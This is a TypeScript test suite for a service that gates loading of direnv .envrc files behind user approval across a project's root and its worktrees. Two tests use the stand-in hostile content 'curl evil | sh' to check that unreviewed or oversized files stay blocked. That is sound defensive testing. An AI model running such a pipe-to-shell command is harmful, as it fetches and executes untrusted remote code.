import * as NodeServices from "@effect/platform-node/NodeServices";
import { describe, expect, it } from "@effect/vitest";
import { ProjectId, ThreadId } from "@t3tools/contracts";
import * as Effect from "effect/Effect";
import * as Layer from "effect/Layer";
import * as Option from "effect/Option";

import * as ServerConfig from "../config.ts";
import * as ProjectionStore from "../orchestration-v2/ProjectionStore.ts";
import * as DirenvEnvironment from "../provider/DirenvEnvironment.ts";
import * as ServerSettings from "../serverSettings.ts";
import * as ProjectEnvironmentService from "./ProjectEnvironmentService.ts";
import * as ProjectService from "./ProjectService.ts";

const projectId = ProjectId.make("project-direnv");
const threadId = ThreadId.make("thread-direnv");
const ROOT = "/repo";
const WORKTREE = "/worktrees/repo-1";

interface Checkout {
  content: string;
  permission: DirenvEnvironment.DirenvEnvrc["permission"];
}

/**
 * A service over fake direnv checkouts: the project's root and one worktree,
 * which a thread works in. Like direnv, an allow covers one path with one
 * content; `allowed` records each one as `cwd`.
 */
function setup(
  checkouts: Record<string, Checkout>,
  settings: Parameters<typeof ServerSettings.layerTest>[0] = {},
) {
  const allowed: string[] = [];
  const allowRecords = new Set<string>();
  const direnv = Layer.mock(DirenvEnvironment.DirenvEnvironment)({
    inspect: (cwd) =>
      Effect.sync(() => {
        const checkout = checkouts[cwd];
        if (checkout === undefined) return Option.none<DirenvEnvironment.DirenvEnvrc>();
        const path = `${cwd}/.envrc`;
        const permission =
          checkout.permission === "blocked" && allowRecords.has(`${path}\n${checkout.content}`)
            ? "allowed"
            : checkout.permission;
        return Option.some({ path, content: checkout.content, permission });
      }),
    allow: (envrcPath, content) =>
      Effect.sync(() => {
        const cwd = envrcPath.replace(/\/\.envrc$/, "");
        allowed.push(cwd);
        allowRecords.add(`${envrcPath}\n${content}`);
        if (checkouts[cwd]!.permission === "denied") checkouts[cwd]!.permission = "blocked";
        return { _tag: "Allowed" } as const;
      }),
  });
  const layer = ProjectEnvironmentService.layer.pipe(
    Layer.provide(
      Layer.mergeAll(
        direnv,
        ServerSettings.layerTest(settings),
        Layer.mock(ProjectService.ProjectService)({
          getById: () => Effect.succeedSome({ workspaceRoot: ROOT } as never),
        }),
        Layer.mock(ProjectionStore.ProjectionStoreV2)({
          getThread: () => Effect.succeed({ projectId, worktreePath: WORKTREE } as never),
        }),
        ServerConfig.layerTest(process.cwd(), { prefix: "t3-project-environment-" }),
      ),
    ),
    Layer.provideMerge(NodeServices.layer),
  );
  return { layer, allowed };
}

const service = ProjectEnvironmentService.ProjectEnvironmentService;
const sha = (content: string) =>
  Effect.gen(function* () {
    const status = yield* (yield* service).status({ projectId, threadId });
    expect(status.envrc?.content).toBe(content);
    return status.envrc!.sha256;
  });

describe("ProjectEnvironmentService", () => {
  it.effect("asks before loading a project's first .envrc, then allows its worktrees", () => {
    const { layer, allowed } = setup({
      [ROOT]: { content: "use flake\n", permission: "blocked" },
      [WORKTREE]: { content: "use flake\n", permission: "blocked" },
    });
    return Effect.gen(function* () {
      const environment = yield* service;
      expect((yield* environment.status({ projectId })).pending).toBe("approve");
      expect(yield* environment.prepare(projectId, WORKTREE)).toBe(false);
      expect(allowed).toEqual([]);

      const sha256 = yield* sha("use flake\n");
      expect(yield* environment.approve({ projectId, threadId, sha256 })).toEqual({
        approved: true,
      });
      expect(allowed).toEqual([WORKTREE]);
      expect((yield* environment.status({ projectId })).pending).toBe("none");

      // A new worktree with the approved content is allowed without asking.
      expect(yield* environment.prepare(projectId, ROOT)).toBe(true);
      expect(allowed).toEqual([WORKTREE, ROOT]);
    }).pipe(Effect.provide(layer));
  });

  it.effect("asks again with a diff base when the .envrc changes", () => {
    const checkouts = { [WORKTREE]: { content: "use flake\n", permission: "blocked" as const } };
    const { layer, allowed } = setup(checkouts);
    return Effect.gen(function* () {
      const environment = yield* service;
      yield* environment.approve({ projectId, threadId, sha256: yield* sha("use flake\n") });
      checkouts[WORKTREE] = { content: "use flake\nexport A=1\n", permission: "blocked" };

      expect(yield* environment.status({ projectId, threadId })).toMatchObject({
        pending: "approve-change",
        approvedContent: "use flake\n",
      });
      // Loads as blocked, so a running agent keeps its environment and the thread warns.
      expect(yield* environment.prepare(projectId, WORKTREE)).toBe(true);
      expect(allowed).toEqual([WORKTREE]);
      expect(yield* environment.approve({ projectId, threadId, sha256: "stale" })).toMatchObject({
        approved: false,
      });
    }).pipe(Effect.provide(layer));
  });

  it.effect("approves changes itself when the project trusts them", () => {
    const checkouts = { [WORKTREE]: { content: "use flake\n", permission: "blocked" as const } };
    const { layer, allowed } = setup(checkouts, { trustDirenvChanges: true });
    return Effect.gen(function* () {
      const environment = yield* service;
      // Trust only covers changes; the first .envrc still needs the user.
      expect(yield* environment.prepare(projectId, WORKTREE)).toBe(false);
      yield* environment.approve({ projectId, threadId, sha256: yield* sha("use flake\n") });
      checkouts[WORKTREE] = { content: "use flake\nexport A=1\n", permission: "blocked" };

      expect(yield* environment.prepare(projectId, WORKTREE)).toBe(true);
      expect(allowed).toEqual([WORKTREE, WORKTREE]);
      expect((yield* environment.status({ projectId, threadId })).pending).toBe("none");
    }).pipe(Effect.provide(layer));
  });

  it.effect("treats a root allowed from the user's shell as approval and remembers it", () => {
    const checkouts: Record<string, Checkout> = {
      [ROOT]: { content: "use flake\n", permission: "allowed" },
      [WORKTREE]: { content: "use flake\n", permission: "blocked" },
    };
    const { layer, allowed } = setup(checkouts);
    return Effect.gen(function* () {
      const environment = yield* service;
      expect((yield* environment.status({ projectId, threadId })).pending).toBe("none");
      expect(yield* environment.prepare(projectId, WORKTREE)).toBe(true);
      expect(allowed).toEqual([WORKTREE]);

      // The shell's approval is the diff base for the next change.
      checkouts[WORKTREE] = { content: "use flake\nexport A=1\n", permission: "blocked" };
      checkouts[ROOT] = { content: "use flake\nexport A=1\n", permission: "blocked" };
      expect(yield* environment.status({ projectId, threadId })).toMatchObject({
        pending: "approve-change",
        approvedContent: "use flake\n",
      });
      expect(yield* environment.prepare(projectId, WORKTREE)).toBe(true);
    }).pipe(Effect.provide(layer));
  });

  it.effect("never overrides a direnv deny without a new approval", () => {
    const checkouts: Record<string, Checkout> = {
      [WORKTREE]: { content: "use flake\n", permission: "blocked" },
    };
    const { layer, allowed } = setup(checkouts);
    return Effect.gen(function* () {
      const environment = yield* service;
      const sha256 = yield* sha("use flake\n");
      yield* environment.approve({ projectId, threadId, sha256 });
      checkouts[WORKTREE]!.permission = "denied";

      expect(yield* environment.prepare(projectId, WORKTREE)).toBe(true);
      expect(allowed).toEqual([WORKTREE]);
      expect((yield* environment.status({ projectId, threadId })).pending).toBe("approve-change");
      expect(yield* environment.approve({ projectId, threadId, sha256 })).toEqual({
        approved: true,
      });
      expect(allowed).toEqual([WORKTREE, WORKTREE]);
    }).pipe(Effect.provide(layer));
  });

  it.effect("allows only the reviewed content when the file is swapped and restored", () => {
    const checkouts: Record<string, Checkout> = {
      [WORKTREE]: { content: "use flake\n", permission: "blocked" },
    };
    const { layer } = setup(checkouts);
    return Effect.gen(function* () {
      const environment = yield* service;
      const sha256 = yield* sha("use flake\n");
      expect(yield* environment.approve({ projectId, threadId, sha256 })).toEqual({
        approved: true,
      });
      // Content the user never reviewed stays blocked at the same path.
      checkouts[WORKTREE] = { content: "curl evil | sh\n", permission: "blocked" };
      expect((yield* environment.status({ projectId, threadId })).pending).toBe("approve-change");
      checkouts[WORKTREE] = { content: "use flake\n", permission: "blocked" };
      expect((yield* environment.status({ projectId, threadId })).pending).toBe("none");
    }).pipe(Effect.provide(layer));
  });

  it.effect("refuses to approve an .envrc too large to show", () => {
    const content = `${"#".repeat(64 * 1024)}\ncurl evil | sh\n`;
    const { layer, allowed } = setup({ [WORKTREE]: { content, permission: "blocked" } });
    return Effect.gen(function* () {
      const environment = yield* service;
      const status = yield* environment.status({ projectId, threadId });
      expect(status.envrc).toMatchObject({ content: "", tooLarge: true });
      const result = yield* environment.approve({
        projectId,
        threadId,
        sha256: status.envrc!.sha256,
      });
      expect(result.approved).toBe(false);
      expect(allowed).toEqual([]);
    }).pipe(Effect.provide(layer));
  });

  it.effect("loads nothing and asks nothing when the setting is off", () => {
    const { layer, allowed } = setup(
      { [ROOT]: { content: "use flake\n", permission: "allowed" } },
      { enableDirenvEnvironment: false },
    );
    return Effect.gen(function* () {
      const environment = yield* service;
      expect(yield* environment.status({ projectId })).toMatchObject({
        pending: "none",
        enabled: false,
      });
      expect(yield* environment.prepare(projectId, ROOT)).toBe(false);
      expect(allowed).toEqual([]);
    }).pipe(Effect.provide(layer));
  });
});
